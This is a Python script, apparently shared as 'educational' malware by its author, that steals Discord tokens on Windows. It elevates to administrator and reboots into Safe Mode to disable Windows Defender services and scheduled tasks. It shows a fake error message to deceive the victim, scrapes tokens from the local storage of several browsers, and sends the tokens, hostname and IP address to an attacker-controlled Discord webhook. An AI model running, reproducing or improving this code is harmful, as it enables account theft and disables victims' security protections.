# THIS CODE IS FOR ONLY EDUCATIONAL PURPOSES ONLY, I AM NOT RESPONSIBLE FOR ANY DAMAGE CAUSED BY THIS CODE, USE IT AT YOUR OWN RISK
# MADE BY LOK999, IF YOU WANT TO SUPPORT ME, JOIN MY DISCORD SERVER: https://discord.gg/qyDDFxYq7
# GO TO LINE 236 TO CHANGE THE WEBHOOK URL AND USERNAME OR IT WONT WORK
import os
import re
import ctypes
import requests
import socket
import os
import sys
import subprocess

# THIS CODE IS THE SCARY PART BE CAREFUL - ANTIVIRUS BYPASS
# WOULDN'T TOUCH IT ;)

def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin() != 0
    except Exception as e:
        print(f"Error checking admin rights: {e}")
        return False


def run_system_command(command):
    try:
        print(f"Executing command: {command}")
        result = subprocess.run(command, check=True, capture_output=True, text=True, shell=True)
        print(result.stdout)
        return result.returncode == 0
    except subprocess.CalledProcessError as e:
        print(f"Error executing command: {command}\nReturn Code: {e.returncode}\nOutput: {e.stdout}\nError: {e.stderr}")
        return False


def enable_safe_mode():
    print("Enabling Safe Mode boot...")
    command = 'bcdedit /set {current} safeboot minimal'
    success = run_system_command(command)
    
    if success:
        print("Safe Mode enabled. Rebooting now...")

        run_system_command('shutdown /r /t 0')
    else:
        print("Failed to enable Safe Mode.")


def disable_defender_services():
    services = [
        "WinDefend", "Sense", "WdFilter", 
        "WdNisDrv", "WdNisSvc", "WdBoot"
    ]
    reg_path = "HKLM:\\SYSTEM\\CurrentControlSet\\Services"
    
   
    for service in services:
        command = f'Set-ItemProperty -Path "{reg_path}\\{service}" -Name Start -Value 4'
        run_system_command(f'powershell -Command "{command}"')
        
    print("Services disabled.")


def disable_defender_tasks():
    tasks = [
        "Windows Defender Cache Maintenance",
        "Windows Defender Cleanup",
        "Windows Defender Scheduled Scan",
        "Windows Defender Verification"
    ]
    
 
    for task in tasks:
        command = f'Get-ScheduledTask "{task}" | Disable-ScheduledTask'
        run_system_command(f'powershell -Command "{command}"')
    
    print("Scheduled tasks disabled.")


def disable_safe_mode():
    print("Disabling Safe Mode boot...")
    command = 'bcdedit /deletevalue {current} safeboot'
    success = run_system_command(command)
    
    if success:
        print("Safe Mode disabled. Rebooting to normal mode now...")
        # Reboot into normal mode
        run_system_command('shutdown /r /t 0')
    else:
        print("Failed to disable Safe Mode. Please manually check Safe Mode status.")


def is_safe_mode():
  
    try:
        result = subprocess.run(['bcdedit'], capture_output=True, text=True)
        return "safeboot" in result.stdout.lower()
    except Exception as e:
        print(f"Error checking Safe Mode status: {e}")
        return False


def ensure_safe_mode_disabled():
    print("Ensuring Safe Mode is disabled...")
    if is_safe_mode():
        print("Safe Mode is still enabled. Attempting to disable again...")
        disable_safe_mode()
    else:
        print("Safe Mode is already disabled.")


if __name__ == "__main__":
    if is_admin():
  
        if is_safe_mode():
            
            print("System is in Safe Mode.")
            disable_defender_services()
            disable_defender_tasks()
           
            disable_safe_mode()
        else:
      
            print("System is in Regular Mode. Switching to Safe Mode...")
            enable_safe_mode()
    else:
    
        print("Script is not running as Administrator. Elevating...")
        try:
            ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)
        except Exception as e:
            print(f"Failed to elevate script to administrator: {e}")
# ENDS HERE

# THIS CODE MAKES IT SO IT SHOWS AN ERROR THE FIRST TIME AND THEN NO MORE

FLAG_FILE = ".has_run_before.txt"

if not os.path.exists(FLAG_FILE):

    print("Error: 0x8004210B - The operation timed out.", file=sys.stderr)
    
    with open(FLAG_FILE, "w") as f:
        f.write("flag")
# ENDS HERE

# THIS CODE GRABS THE IP ADDRESS AND HOSTNAME AND SENDS IT TO A DISCORD WEBHOOK

host_name = socket.gethostname()
print("PC NAME: {}".format(host_name))
ip_address = socket.gethostbyname(host_name)
print("IP Address: {}".format(ip_address))

# ENDS HERE

# TOKPART STARTS HERE


webhook_url = "your discord webhook"

def get_token():
    # this is brave browser path you can add as much browsers if you want
    path = os.getenv('LOCALAPPDATA') + r'\BraveSoftware\Brave-Browser\User Data\Default\Local Storage\leveldb'
    path1 = os.getenv('LOCALAPPDATA') + r'\Google\Chrome\User Data\Default\Local Storage\leveldb' 
    path2 = os.getenv('LOCALAPPDATA') + r'\Yandex\YandexBrowser\User Data\Default\Local Storage\leveldb' 
    path3 = os.getenv('LOCALAPPDATA') + r'\Opera Software\Opera Stable\Local Storage\leveldb' 
    path4 = os.getenv('LOCALAPPDATA') + r'\Opera GX Stable\Local Storage\leveldb'
    
    
    if not os.path.exists(path1):
        return None
    for file in os.listdir(path1):
        if file.endswith('.log') or file.endswith('.ldb'):
            with open(os.path.join(path1, file), 'r', encoding='utf-8', errors='ignore') as f:
                for line in f:
                    # this is the regex pattern discord uses btw
                    token = re.findall(r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}', line)
                    if token:
                        return token[0]
                    
    if not os.path.exists(path2):
        return None

    for file in os.listdir(path2):
        if file.endswith('.log') or file.endswith('.ldb'):
            with open(os.path.join(path2, file), 'r', encoding='utf-8', errors='ignore') as f:
                for line in f:
                    # this is the regex pattern discord uses btw
                    token = re.findall(r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}', line)
                    if token:
                        return token[0]


    if not os.path.exists(path3):
        return None

    for file in os.listdir(path3):
        if file.endswith('.log') or file.endswith('.ldb'):
            with open(os.path.join(path3, file), 'r', encoding='utf-8', errors='ignore') as f:
                for line in f:
                    token = re.findall(r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}', line)
                    if token:
                        return token[0]
                    

    if not os.path.exists(path4):
        return None

    for file in os.listdir(path4):
        if file.endswith('.log') or file.endswith('.ldb'):
            with open(os.path.join(path4, file), 'r', encoding='utf-8', errors='ignore') as f:
                for line in f:
                    # this is the regex pattern discord uses btw
                    token = re.findall(r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}', line)
                    if token:
                        return token[0]


    if not os.path.exists(path):
        return None

    for file in os.listdir(path):
        if file.endswith('.log') or file.endswith('.ldb'):
            with open(os.path.join(path, file), 'r', encoding='utf-8', errors='ignore') as f:
                for line in f:
                    # this is the regex pattern discord uses btw
                    token = re.findall(r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}', line)
                    if token:
                        return token[0]
    return None

token = get_token()
# ENDS HERE

# DISCORD WEBHOOK PART STARTS HERE
from discord_webhook import DiscordWebhook, DiscordEmbed
content = "FOUND IP ADDRESS"
webhook = DiscordWebhook(url="YOUR WEBHOOK URL", username="WEBHOOKS NAME", content=content)
embed = DiscordEmbed(title="IP:" + ip_address, description="Hostname: " + host_name, color=0x00ff00)
embedn2 = DiscordEmbed(description=f"Token: {token}" if token else "No token found", color=0x00ff00)
webhook.add_embed(embed)
webhook.add_embed(embedn2)
response = webhook.execute()
# ENDS HERE

# FAKE ERROR CODE

import sys

print("Error: 0x8004210B - The operation timed out.", file=sys.stderr)

# ENDS HERE
